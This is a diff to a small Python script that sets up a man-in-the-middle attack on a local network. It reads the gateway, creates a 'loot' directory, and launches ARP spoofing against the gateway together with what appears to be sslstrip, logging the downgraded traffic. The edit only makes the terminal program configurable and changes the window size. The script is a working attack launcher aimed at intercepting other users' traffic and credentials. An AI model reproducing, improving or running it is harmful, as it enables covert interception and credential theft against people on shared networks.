@@ -6,7 +6,8 @@ def x(c): return subprocess.Popen(shlex.split(c), stdout=subprocess.PIPE)
 
 ps={}
 port=8100
-geo="--geometry=200x30"
+geo="--geometry=200x80"
+term='xterm'
 
 def getifgate():
   p=x("route -n")
@@ -34,8 +35,8 @@ if True:
   gate, iface = getifgate()
   setup(port)
   dr = makeloot('amanda')
-  ps['ssls']=x('terminator %s -e "ssls -k -l %d -w %s"' % (geo, port, dr+"ssls.log"))
-  ps['arp']=x('terminator %s -e "arpspoof -i %s %s"' % (geo, iface, gate))
+  ps['ssls']=x('%s %s -e "ssls -k -l %d -w %s"' % (term, geo, port, dr+"ssls.log"))
+  ps['arp']=x('%s %s -e "arpspoof -i %s %s"' % (term, geo, iface, gate))
   i = input("> ")
   clean()
 #except: clean()
